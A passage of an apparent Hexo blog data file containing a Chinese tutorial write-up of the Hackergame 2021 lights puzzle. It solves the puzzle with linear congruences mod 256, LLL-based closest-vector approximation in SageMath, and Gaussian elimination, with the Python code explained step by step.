& 0 & \\cdots & 256 & 0 \\\\\\\\\n    -189 & -189 & -189 & -189 & -189 & \\cdots & -189 & 256\\\\\\\\\n    \\end{pmatrix}\n    $$\n\n    此时矩阵 $m$ 的前 272 个行向量(即除开最后一个行向量)的**整系数线性组合**即为操作后可以得到的方阵化为一维后的向量， Level0 时只需令该向量与解向量相等，而 Level1 和 Level2 则需要算出离解向量**最近**的可由**这 272 个向量整数系线性表出的向量**作为**新的解向量**，因为我们**不保证在一些点不可操作的前提下仍能整数系线性表出解向量**(**重点，敲黑板**) 。\n    同时由于题目在模意义下进行，所以若解出的系数为负整数也可以模 256 化为正整数。\n    而 $m$ 的最后一个行向量为负的解向量，这里留给后面解释。\n\n    ```Python\n    n = len(m)\n    print('pre ok')\n    m2 = Matrix(m).LLL()\n    print('lll ok')\n    ```\n\n    这里 n 取得 m 的行向量数，即 (144-16+144+1)=273 ，然后对 m 跑 LLL 算法进行格基规约，仍然得到一个 273x145 的矩阵。\n    ********************************\n    > 我最常用的求 CVP 的近似解的办法是，给原来每个向量后面加个 0，然后再加个新向量，前面的位置是欲求 CVP 的向量，最后是一个很大的常数。给这个新的格跑一遍 LLL，结果中最后是大常数的那一行，就是我们想要的答案。—— mcfx\n\n    **这就是为什么最后要补一列零向量的原因。**\n    ********************************\n    同时上面有一个细节，那就是 $m$ 的最后一个行向量为负的解向量，结合神的解释，我发现，若矩阵中最后一个行向量的最后一个维度为大常数，其他行向量的最后一个维度为 0 ，那么 LLL 后最后这个行向量只是与其他行向量的线性组合进行**一次相加(或相减)**，也就是说，这个方法将 CVP 化为 SVP 问题时，**求解 SVP 的过程中不会对这个特殊行向量进行任何数乘！** 那么将这个向量直接乘上-1然后加上原来的解向量再抹去最后一维就是CVP的解了。\n    同时我观察了 m2 (即 `m.LLL` 后的结果)的特征，发现 273 个行向量中的 128 个均为零向量，恰为 273-145 个。这里有一个有趣的问题，那就是**这 273 组基是否可以互相线性表出**。\n\n    在线性代数中，一般的，我们在欧几里得空间即**实数域**里讨论向量的**实数系**组合问题，此时 145 维向量空间里的每个向量都可以由 145 个线性无关的向量线性表出。而格中是在向量的**整数系**组合下讨论问题，此时情况就有所不同了，比如以 $(1,1)$ 和 $(-1,1)$ 为基张成的格并不包括 $(1,0)$ 等向量，即不存在整数 $m,n$ 满足 $m*(1,1)+n*(-1,1)=(1,0)$ 。\n\n3. **找到 CVP 的答案**\n\n    ```Python\n    for i in range(n):\n        if m2[i][144]:\n            for j in range(144):\n                m[-1][j] = m2[i][j] - m[-1][j]\n            print(sum(abs(m2[i][j]) for j in range(144)))\n            break\n    ```\n\n    由上面分析可知，此时 `m[-1]` 的前 144 维就是**新的解向量**。至此， Level1 和 Level2 就可以化为 Level0 的解法了。\n4. **跑高斯消元求解**\n\n    ```Python\n    s = []\n    for i in range(144):\n        t = []\n        for j in range(len(free)):\n            t.append(m[j][i])\n        t.append(m[-1][i] % 256)\n        s.append(t)\n    ```\n\n    上面知道 `free[]` 是可以操作的点的坐标列表，故 `len(free[])` 即为 144-16=128 。\n    这里取 $m$ 的前 (144-16)=128 个行向量的前 144 维进行**转置**作为系数矩阵与 $m$ 的最后一行向量的前 144 维变为列向量，合成增广矩阵，即为一个标准的非齐次线性方程组，即 $s$ 为一个如下的 144x145 的矩阵：\n    $$\n    s=\\begin{pmatrix}\n    3 & 2 & 1 & 0 & 0 & \\cdots & 0 & 189\\\\\\\\\n    2 & 3 & 2 & 1 & 0 & \\cdots & 0 & 190\\\\\\\\\n    1 & 2 & 3 & 2 & 1 & \\cdots & 0 & 191\\\\\\\\\n    0 & 1 & 2 & 3 & 2 & \\cdots & 0 & 189\\\\\\\\\n    \\vdots & \\vdots & \\vdots & \\vdots & \\vdots & \\ddots & \\vdots & \\vdots \\\\\\\\\n    0 & 0 & 0 & 0 & 0 & \\cdots & 3 & 189\n    \\end{pmatrix}\n    $$\n\n    ```Python\n    for i in range(len(free)):\n        for j in range(i + 1, 144):\n            while s[j][i]:\n                t = s[i][i] // s[j][i]\n                for k in range(len(free) + 1):\n                    s[i][k], s[j][k] = s[j][k], (s[i][k] - s[j][k] * t) % 256\n    for i in range(len(free), 144):\n        assert s[i][len(free)] == 0\n    ```\n\n    经以上消元后 $s$ 的第 129 行到最后一行均为 0 ，且系数矩阵与增广矩阵等秩，方程组有唯一解， $s$ 为如下的上三角矩阵：\n    $$\n    s=\\begin{pmatrix}\n    1 & 0 & 0 & 0 & 0 & \\cdots & 0 & 188\\\\\\\\\n    0 & 1 & 0 & 0 & 0 & \\cdots & 0 & 188\\\\\\\\\n    0 & 0 & 1 & 0 & 0 & \\cdots & 0 & 189\\\\\\\\\n    0 & 0 & 0 & 1 & 0 & \\cdots & 0 & 189\\\\\\\\\n    0 & 0 & 0 & 0 & 1 & \\cdots & 0 & 190\\\\\\\\\n    \\vdots & \\vdots & \\vdots & \\vdots & \\vdots & \\ddots & \\vdots & \\vdots \\\\\\\\\n    0 & 0 & 0 & 0 & 0 & \\cdots & 1 & 127\n    \\end{pmatrix}\n    $$\n\n    ```Python\n    ans = [0] * len(free)\n    for i in range(len(free) - 1, -1, -1):\n        t = s[i][len(free)]\n        for j in range(i + 1, len(free)):\n            t = (t - ans[j] * s[i][j]) % 256\n        for j in range(256):\n            if j * s[i][i] % 256 == t:\n                ans[i] = j\n    ```\n\n5. **提交答案**\n\n    ```Python\n    sol = [[0] * 12 for _ in range(12)]\n    for i, (x, y) in enumerate(free):\n        sol[x][y] = ans[i]\n    print(sol)\n\n    data = {\n        'level': level_id,\n        'solution': str(sol),\n    }\n\n    headers = {'Cookie': 'xxx'}\n    r = requests.post('http://202.38.93.111:12768/submit', headers=headers, data=data)\n    print(r.text)\n    ```\n\n## 遇到的一些问题\n\n* **Latex 矩阵无法正常显示**\n    有少少离奇，这个博客主题要在矩阵的每行结尾加四个反斜杠才能正常换行，否则就挤作一行。\n\n## 参考\n\n* <https://mcfx.us/posts/2021-10-30-hackergame-2021-writeup/>\n* <https://docs.python.org/3/library/sys.html>\n* <https://zhuanlan.zhihu.com/p/67978661>\n","source":"_posts/灯，等灯等灯.md","raw":"---\ntitle: 灯，等灯等灯\ndate: 2022-03-31 10:18:00\ntags: [Python,数学,格,抽象代数,CVP]\ncategories: 题解\n---\n\n线性同余方程组与格基约化问题\n<!--more-->\n\n## 前言\n\n> 没有听到吗？在耳边回荡着的钟声。\n>\n> 传闻中，远古文明能够捕猎闪电，将其封印在蜿蜒曲折的法阵中，用以驱动炼金术的最高成就——机械之心。\n>\n> 而在诸多机械之心的流派里，蔚蓝是曾经的王者。无信者窃取神明的奇迹，沉湎于蔚蓝创造出来的虚幻之间，得以逃避残酷的现实。\n>\n> 只是，火已渐熄，位不见王影。那一抹纯净的蔚蓝也逐渐染上铜锈和铁锈的颜色。破落的圣殿中只剩无名的巡礼者，还在追寻当年先知摩尔留下的足迹。\n>\n> 此时才明白，那则预言的含义：火焰熄灭之时，钟声响起，余灰纷沓而来，解开沉寂千年的机关，点亮传承的图腾。无火的余灰不能成为柴薪，可也许正因这样，才会如此向往光明吧。\n>\n> 还没有听到吗？那回荡在耳边的，古老而熟悉的，钟声——\n>\n> 灯，等灯等灯\n\n以上是 Hackergame 2021 的一道点灯题的题文。\n\n解这题的时候连线代都不会，拿到神的题解也跑不起来，后来才知道 Sagemath 要另行安装， `pip install sage` 是无用的。\n前些天在单人豪华房里坐了几天牢，趁机也入门了一下格密码，隐约联想到这道题有点类似 CVP 的感觉，而再回头看神的题解果真也是这个思路，如今便借着学习一下 Python 和格。\n考虑到读者水平可能与我相近，故以下的分析我尽可能做到详细，几乎每一步都有分析，相应的，文章篇幅也会比较长。如果能认真读完并理解，相信会有不小的收获。\n\n## 题目链接\n\n<http://202.38.93.111:12768/login?token=1:MEQCIBY0ubN3BOXYsuRdXzqWIWNf8Jx0Y6giZCSp/Rg8zdNwAiBMZGWaiIGLD33KTfQ5TTLejp9PwGp8Gg4HsJbdo8sVig==>\n如果还没关的话应该能打开（）\n> 好吧已经 Hackergame 2022 了，关了。\n\n## 灯 by mcfx详解\n\n注：此题共 3 关，为 Level0 、 Level1 及 Level2 ，由于 Level1 综合了三关的解法，故以下均以 Level1 为例。\n\n1. **准备数据及函数**\n\n    ```Python\n    from sage.all import *\n    import sys, requests\n\n    target = [\n        [189, 189, 189, 189, 189, 33, 33, 33, 189, 189, 189, 189],\n        [189, 189, 189, 33, 33, 33, 189, 33, 44, 189, 189, 189],\n        [189, 189, 189, 189, 189, 33, 33, 33, 33, 189, 189, 189],\n        [189, 189, 189, 189, 189, 33, 189, 33, 33, 189, 189, 189],\n        [189, 189, 189, 33, 33, 189, 189, 33, 33, 33, 189, 189],\n        [189, 134, 33, 33, 189, 189, 189, 189, 33, 33, 189, 189],\n        [189, 144, 33, 33, 189, 189, 189, 189, 33, 189, 189, 189],\n        [189, 142, 33, 33, 189, 189, 189, 189, 33, 33, 33, 189],\n        [189, 100, 142, 33, 189, 189, 189, 189, 33, 33, 33, 189],\n        [189, 142, 142, 189, 189, 189, 189, 189, 189, 33, 189, 189],\n        [189, 59, 142, 33, 189, 189, 189, 189, 33, 189, 189, 189],\n        [189, 189, 33, 33, 189, 189, 189, 189, 189, 189, 189, 189],\n    ]\n\n    def level01_val(i, j, x, y):\n        if (x == i or y == j):\n            return 3 - (abs(x - i) + abs(y - j))\n        return 0\n\n    def level2_val(i, j, x, y):\n        return [31, 63, 127][max(abs(x - i), abs(y - j))]\n\n    levels = [\n        (level01_val, '''\n    ............\n    ............\n    ............\n    ............\n    ............\n    ............\n    ............\n    ............\n    ............\n    ............\n    ............\n    ............\n    '''),\n        (level01_val, '''\n    ............\n    ............\n    ..X.X.......\n    ..XXX.......\n    ..X.X.......\n    ............\n    .......XXX..\n    .......X....\n    .......X.X..\n    .......XXX..\n    ............\n    ............\n    '''),\n        (level2_val, '''\n    ............\n    ............\n    ..X.X...XX..\n    ..X.X...X...\n    ..XXX..XX...\n    ............\n    ............\n    ..XXX..XXX..\n    ...X...X....\n    ...X...XXX..\n    ............\n    ............\n    ''')\n    ]\n\n    def id(x, y): return x * 12 + y\n\n    level_id = int(sys.argv[1])\n    ban = list(map(lambda x: [y == 'X'for y in x], levels[level_id][1].split()))\n    ```\n\n    * `from sage.all import *`\n首先要**安装 Sagemath**，因为 Sagemath 在 Windows 下运行也是要虚拟出一个 Unix 环境，故建议在 WSL 里 `sudo apt install sagemath` ，可能中途要 `apt-get upgrade` 。\n    * `sys.argv[1]`\n`argv[0]` 是脚本名称（它是否为完整路径名取决于操作系统）。则 `argv[1]` 为省去后缀名的文件名，如 Level0 时为脚本名为 `0.py` ， `argv[1]` 为 0 。\n    * `ban = list(map(lambda x: [y == 'X'for y in x], levels[level_id][1].split()))`\n    `lambda` 是 Python 的一个关键字，可以用来定义**匿名函数**。\n所谓匿名函数，就是没有名字的函数，与命名函数类似，都有参数和返回值，只是没有名字。\n如 `add=lambda x, y: x+y` 这个函数就将传入的两个参数相加，返回结果，即 `add(1, 2)` 等于 `1+2` ； `map(lambda x: x+1, [1, 2, 3])` 将列表 [1, 2, 3] 中的元素分别加 1 ，其结果 [2, 3, 4] 。\n这里 `map(lambda x: [y == 'X'for y in x], levels[level_id][1].split())` 一句是将上面定义的 12 阶方阵中 `X` 转为 `True` ， `.` 转为 `False` ，然后放入一个列表 `ban` 中，此时 `ban` 为两级列表。\n2. **准备矩阵系数**\n\n    ```Python\n    m = []\n    free = []\n    for i in range(12):\n        for j in range(12):\n            if ban[i][j]:\n                continue\n            free.append((i, j))\n            t = [0] * 144\n            for x in range(i - 2, i + 3):\n                for y in range(j - 2, j + 3):\n                    if (0 <= x < 12) and (0 <= y < 12):\n                        t[id(x, y)] = levels[level_id][0](i, j, x, y)\n            m.append(t + [0])\n    ```\n\n    * `levels[level_id][0](i, j, x, y)`\n    这里是在元组里放函数，注意到上面的 `Levels=[(levev01_val, '''...'''),(...),(...)]` ，所以 `levels[level_id][0]` 是 `levev01_val` 函数。这样的用法如：\n\n        ```Python\n        def add(x,y):return x+y\n        tup=(add,1,2)\n        print(tup[0](tup[1],tup[2]))\n        # 3\n        ```\n\n        list也可以实现类似操作，Python确实花.jpg。\n\n    不难发现， free[] 里放的是可以点的坐标，如 $(0,0),(0,1)...$\n    注意到， `level01_val` 函数在上面已经定义：\n\n    ```Python\n    def level01_val(i, j, x, y):\n    if (x == i or y == j):\n        return 3 - (abs(x - i) + abs(y - j))\n    return 0\n    ```\n\n    这个函数的参数中 `i,j` 为操作的点(即按下的点)坐标， `x,y` 为受影响的点坐标，**返回值为受影响坐标的增量**。\n    如 `(i,j)` 为 $(2,3)$ 时，若 `x,y` 为 $(2,3)$ ，则根据规则，返回值为 3 ，若 `x,y` 为 $(2,4)$ ，则返回值为 2 ，若 `x,y` 为 $(3,3)$ ，则返回值为 2 ，若 `x,y` 为 $(3,4)$ ，则返回值为 0 。如下表：\n    | x\\y\\返回值 | 2 | 3 | 4 |\n    | :----: | :----: | :----: | :----: |\n    | 1 | 0 | 2 | 0 |\n    | 2 | 2 | 3 | 2 |\n    | 3 | 0 | 2 | 0 |\n\n    ```Python\n    for x in range(i - 2, i + 3):\n        for y in range(j - 2, j + 3):\n            if (0 <= x < 12) and (0 <= y < 12):\n                t[id(x, y)] = levels[level_id][0](i, j, x, y)\n    m.append(t + [0])\n    ```\n\n    上面已经定义函数 `def id(x, y): return x * 12 + y` ，即 `id` 函数把给定的**坐标**转为方阵**一维展开后的位置**，则此处把每个操作点对整个方阵 144 个位置影响(增量)后面补一个 0 （下面会解释为什么加一个 0 ）放入 `t[]` 中，此时t可以看作一个**向量**。\n    每个 `t[]` 补入 `m[]` 后，此时 $m$ 是一个 (144-16)x(144+1) 即 **128x145** 的矩阵，且第 145 列全为 0 ( 16 为 X 即**不可操作点的数量**)，如下：\n    $$\n    m=\\begin{pmatrix}\n    3 & 2 & 1 & 0 & 0 & \\cdots & 0 \\\\\\\\\n    2 & 3 & 2 & 1 & 0 & \\cdots & 0 \\\\\\\\\n    1 & 2 & 3 & 2 & 1 & \\cdots & 0 \\\\\\\\\n    0 & 1 & 2 & 3 & 2 & \\cdots & 0 \\\\\\\\\n    \\vdots & \\vdots & \\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\\\\\\n    0 & 0 & 0 & 0 & 0 & \\cdots & 0\n    \\end{pmatrix}\n    $$\n\n    **注意：上面打省略号的地方不全为0！**\n    比如第一行是由如下一个 12x12 的矩阵展开为一维形式：\n    $$\n    \\begin{pmatrix}\n    3 & 2 & 1 & 0 & 0 & \\cdots & 0 \\\\\\\\\n    2 & 0 & 0 & 0 & 0 & \\cdots & 0 \\\\\\\\\n    1 & 0 & 0 & 0 & 0 & \\cdots & 0 \\\\\\\\\n    0 & 0 & 0 & 0 & 0 & \\cdots & 0 \\\\\\\\\n    \\vdots & \\vdots & \\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\\\\\\n    0 & 0 & 0 & 0 & 0 & \\cdots & 0\n    \\end{pmatrix}\n    $$\n\n    ```Python\n    for i in range(144):\n        m.append([(i == j) * 256 for j in range(144)] + [0])\n\n    t = []\n    for i in range(12):\n        for j in range(12):\n            t.append(target[i][j])\n    C = 256\n    m.append([-x for x in t] + [C])\n    ```\n\n    不难看出，此时的 $m$ 为如下形式：\n    $$\n    m=\\begin{pmatrix}\n    3 & 2 & 1 & 0 & 0 & \\cdots & 0 & 0\\\\\\\\\n    2 & 3 & 2 & 1 & 0 & \\cdots & 0 & 0\\\\\\\\\n    1 & 2 & 3 & 2 & 1 & \\cdots & 0 & 0\\\\\\\\\n    0 & 1 & 2 & 3 & 2 & \\cdots & 0 & 0\\\\\\\\\n    \\vdots & \\vdots & \\vdots & \\vdots & \\vdots & \\ddots & \\vdots & \\vdots \\\\\\\\\n    0 & 0 & 0 & 0 & 0 & \\cdots & 3 & 0\\\\\\\\\n    256 & 0 & 0 & 0 & 0 & \\cdots & 0 & 0\\\\\\\\\n    0 & 256 & 0 & 0 & 0 & \\cdots & 0 & 0\\\\\\\\\n    0 & 0 & 256 & 0 & 0 & \\cdots & 0 & 0\\\\\\\\\n    0 & 0 & 0 & 256 & 0 & \\cdots & 0 & 0\\\\\\\\\n    0 & 0 & 0 & 0 & 256 & \\cdots & 0 & 0\\\\\\\\\n    \\vdots & \\vdots & \\vdots & \\vdots & \\vdots & \\ddots & \\vdots & \\vdots \\\\\\\\\n    0 & 0 & 0 & 0 & 0 & \\cdots & 256 & 0 \\\\\\\\\n    -189 & -189 & -189 & -189 & -189 & \\cdots & -189 & 256\\\\\\\\\n    \\end{pmatrix}\n    $$\n\n    此时矩阵 $m$ 的前 272 个行向量(即除开最后一个行向量)的**整系数线性组合**即为操作后可以得到的方阵化为一维后的向量， Level0 时只需令该向量与解向量相等，而 Level1 和 Level2 则需要算出离解向量**最近**的可由**这 272 个向量整数系线性表出的向量**作为**新的解向量**，因为我们**不保证在一些点不可操作的前提下仍能整数系线性表出解向量**(**重点，敲黑板**) 。\n    同时由于题目在模意义下进行，所以若解出的系数为负整数也可以模 256 化为正整数。\n    而 $m$ 的最后一个行向量为负的解向量，这里留给后面解释。\n\n    ```Python\n    n = len(m)\n    print('pre ok')\n    m2 = Matrix(m).LLL()\n    print('lll ok')\n    ```\n\n    这里 n 取得 m 的行向量数，即 (144-16+144+1)=273 ，然后对 m 跑 LLL 算法进行格基规约，仍然得到一个 273x145 的矩阵。\n    ********************************\n    > 我最常用的求 CVP 的近似解的办法是，给原来每个向量后面加个 0，然后再加个新向量，前面的位置是欲求 CVP 的向量，最后是一个很大的常数。给这个新的格跑一遍 LLL，结果中最后是大常数的那一行，就是我们想要的答案。—— mcfx\n\n    **这就是为什么最后要补一列零向量的原因。**\n    ********************************\n    同时上面有一个细节，那就是 $m$ 的最后一个行向量为负的解向量，结合神的解释，我发现，若矩阵中最后一个行向量的最后一个维度为大常数，其他行向量的最后一个维度为 0 ，那么 LLL 后最后这个行向量只是与其他行向量的线性组合进行**一次相加(或相减)**，也就是说，这个方法将 CVP 化为 SVP 问题时，**求解 SVP 的过程中不会对这个特殊行向量进行任何数乘！** 那么将这个向量直接乘上-1然后加上原来的解向量再抹去最后一维就是CVP的解了。\n    同时我观察了 m2 (即 `m.LLL` 后的结果)的特征，发现 273 个行向量中的 128 个均为零向量，恰为 273-145 个。这里有一个有趣的问题，那就是**这 273 组基是否可以互相线性表出**。\n\n    在线性代数中，一般的，我们在欧几里得空间即**实数域**里讨论向量的**实数系**组合问题，此时 145 维向量空间里的每个向量都可以由 145 个线性无关的向量线性表出。而格中是在向量的**整数系**组合下讨论问题，此时情况就有所不同了，比如以 $(1,1)$ 和 $(-1,1)$ 为基张成的格并不包括 $(1,0)$ 等向量，即不存在整数 $m,n$ 满足 $m*(1,1)+n*(-1,1)=(1,0)$ 。\n\n3. **找到 CVP 的答案**\n\n    ```Python\n    for i in range(n):\n        if m2[i][144]:\n            for j in range(144):\n                m[-1][j] = m2[i][j] - m[-1][j]\n            print(sum(abs(m2[i][j]) for j in range(144)))\n            break\n    ```\n\n    由上面分析可知，此时 `m[-1]` 的前 144 维就是**新的解向量**。至此， Level1 和 Level2 就可以化为 Level0 的解法了。\n4. **跑高斯消元求解**\n\n    ```Python\n    s = []\n    for i in range(144):\n        t = []\n        for j in range(len(free)):\n            t.append(m[j][i])\n        t.append(m[-1][i] % 256)\n        s.append(t)\n    ```\n\n    上面知道 `free[]` 是可以操作的点的坐标列表，故 `len(free[])` 即为 144-16=128 。\n    这里取 $m$ 的前 (144-16)=128 个行向量的前 144 维进行**转置**作为系数矩阵与 $m$ 的最后一行向量的前 144 维变为列向量，合成增广矩阵，即为一个标准的非齐次线性方程组，即 $s$ 为一个如下的 144x145 的矩阵：\n    $$\n    s=\\begin{pmatrix}\n    3 & 2 & 1 & 0 & 0 & \\cdots & 0 & 189\\\\\\\\\n    2 & 3 & 2 & 1 & 0 & \\cdots & 0 & 190\\\\\\\\\n    1 & 2 & 3 & 2 & 1 & \\cdots & 0 & 191\\\\\\\\\n    0 & 1 & 2 & 3 & 2 & \\cdots & 0 & 189\\\\\\\\\n    \\vdots & \\vdots & \\vdots & \\vdots & \\vdots & \\ddots & \\vdots & \\vdots \\\\\\\\\n    0 & 0 & 0 & 0 & 0 & \\cdots & 3 & 189\n    \\end{pmatrix}\n    $$\n\n    ```Python\n    for i in range(len(free)):\n        for j in range(i + 1, 144):\n            while s[j][i]:\n                t = s[i][i] // s[j][i]\n                for k in range(len(free) + 1):\n                    s[i][k], s[j][k] = s[j][k], (s[i][k] - s[j][k] * t) % 256\n    for i in range(len(free), 144):\n        assert s[i][len(free)] == 0\n    ```\n\n    经以上消元后 $s$ 的第 129 行到最后一行均为 0 ，且系数矩阵与增广矩阵等秩，方程组有唯一解， $s$ 为如下的上三角矩阵：\n    $$\n    s=\\begin{pmatrix}\n    1 & 0 & 0 & 0 & 0 & \\cdots & 0 & 188\\\\\\\\\n    0 & 1 & 0 & 0 & 0 & \\cdots & 0 & 188\\\\\\\\\n    0 & 0 & 1 & 0 & 0 & \\cdots & 0 & 189\\\\\\\\\n    0 & 0 & 0 & 1 & 0 & \\cdots & 0 & 189\\\\\\\\\n    0 & 0 & 0 & 0 & 1 & \\cdots & 0 & 190\\\\\\\\\n    \\vdots & \\vdots & \\vdots & \\vdots & \\vdots & \\ddots & \\vdots & \\vdots \\\\\\\\\n    0 & 0 & 0 & 0 & 0 & \\cdots & 1 & 127\n    \\end{pmatrix}\n    $$\n\n    ```Python\n    ans = [0] * len(free)\n    for i in range(len(free) - 1, -1, -1):\n        t = s[i][len(free)]\n        for j in range(i + 1, len(free)):\n            t = (t - ans[j] * s[i][j]) % 256\n        for j in range(256):\n            if j * s[i][i] % 256 == t:\n                ans[i] = j\n    ```\n\n5. **提交答案**\n\n    ```Python\n    sol = [[0] * 12 for _ in range(12)]\n    for i, (x, y) in enumerate(free):\n        sol[x][y] = ans[i]\n    print(sol)\n\n    data = {\n        'level': level_id,\n        'solution': str(sol),\n    }\n\n    headers = {'Cookie': 'xxx'}\n    r = requests.post('http://202.38.93.111:12768/submit', headers=headers, data=data)\n    print(r.text)\n    ```\n\n## 遇到的一些问题\n\n* **Latex 矩阵无法正常显示**\n    有少少离奇，这个博客主题要在矩阵的每行结尾加四个反斜杠才能正常换行，否则就挤作一行。\n\n## 参考\n\n* <https://mcfx.us/posts/2021-10-30-hackergame-2021-writeup/>\n* <https://docs.python.org/3/library/sys.html>\n* <https://zhuanlan.zhihu.com/p/67978661>\n","slug":"灯，等灯等灯","published":1,"updated":"2023-11-04T18:31:02.802Z","_id":"cl8wgpppx0041ck6ggq1hbdsq","comments":1,"layout":"post","photos":[],"content":"<p>线性同余方程组与格基约化问题</p>\n<span id=\"more\"></span>\n\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><blockquote>\n<p>没有听到吗？在耳边回荡着的钟声。</p>\n<p>传闻中，远古文明能够捕猎闪电，将其封印在蜿蜒曲折的法阵中，用以驱动炼金术的最高成就——机械之心。</p>\n<p>而在诸多机械之心的流派里，蔚蓝是曾经的王者。无信者窃取神明的奇迹，沉湎于蔚蓝创造出来的虚幻之间，得以逃避残酷的现实。</p>\n<p>只是，火已渐熄，位不见王影。那一抹纯净的蔚蓝也逐渐染上铜锈和铁锈的颜色。破落的圣殿中只剩无名的巡礼者，还在追寻当年先知摩尔留下的足迹。</p>\n<p>此时才明白，那则预言的含义：火焰熄灭之时，钟声响起，余灰纷沓而来，解开沉寂千年的机关，点亮传承的图腾。无火的余灰不能成为柴薪，可也许正因这样，才会如此向往光明吧。</p>\n<p>还没有听到吗？那回荡在耳边的，古老而熟悉的，钟声——</p>\n<p>灯，等灯等灯</p>\n</blockquote>\n<p>以上是 Hackergame 2021 的一道点灯题的题文。</p>\n<p>解这题的时候连线代都不会，拿到神的题解也跑不起来，后来才知道 Sagemath 要另行安装， <code>pip install sage</code> 是无用的。<br>前些天在单人豪华房里坐了几天牢，趁机也入门了一下格密码，隐约联想到这道题有点类似 CVP 的感觉，而再回头看神的题解果真也是这个思路，如今便借着学习一下 Python 和格。<br>考虑到读者水平可能与我相近，故以下的分析我尽可能做到详细，几乎每一步都有分析，相应的，文章篇幅也会比较长。如果能认真读完并理解，相信会有不小的收获。</p>\n<h2 id=\"题目链接\"><a href=\"#题目链接\" class=\"headerlink\" title=\"题目链接\"></a>题目链接</h2><p><a href=\"http://202.38.93.111:12768/login?token=1:MEQCIBY0ubN3BOXYsuRdXzqWIWNf8Jx0Y6giZCSp/Rg8zdNwAiBMZGWaiIGLD33KTfQ5TTLejp9PwGp8Gg4HsJbdo8sVig==\">http://202.38.93.111:12768/login?token=1:MEQCIBY0ubN3BOXYsuRdXzqWIWNf8Jx0Y6giZCSp/Rg8zdNwAiBMZGWaiIGLD33KTfQ5TTLejp9PwGp8Gg4HsJbdo8sVig==</a><br>如果还没关的话应该能打开（）</p>\n<blockquote>\n<p>好吧已经 Hackergame 2022 了，关了。</p>\n</blockquote>\n<h2 id=\"灯-by-mcfx详解\"><a href=\"#灯-by-mcfx详解\" class=\"headerlink\" title=\"灯 by mcfx详解\"></a>灯 by mcfx详解</h2><p>注：此题共 3 关，为 Level0 、 Level1 及 Level2 ，由于 Level1 综合了三关的解法，故以下均以 Level1 为例。</p>\n<ol>\n<li><p><strong>准备数据及函数</strong></p>\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> sage.<span class=\"built_in\">all</span> <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys, requests</span><br><span class=\"line\"></span><br><span class=\"line\">target = [</span><br><span class=\"line\">    [<span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>],</span><br><span class=\"line\">    [<span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>, <span class=\"number\">33</span>, <span class=\"number\">44</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>],</span><br><span class=\"line\">    [<span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>],</span><br><span class=\"line\">    [<span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>],</span><br><span class=\"line\">    [<span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>],</span><br><span class=\"line\">    [<span class=\"number\">189</span>, <span class=\"number\">134</span>, 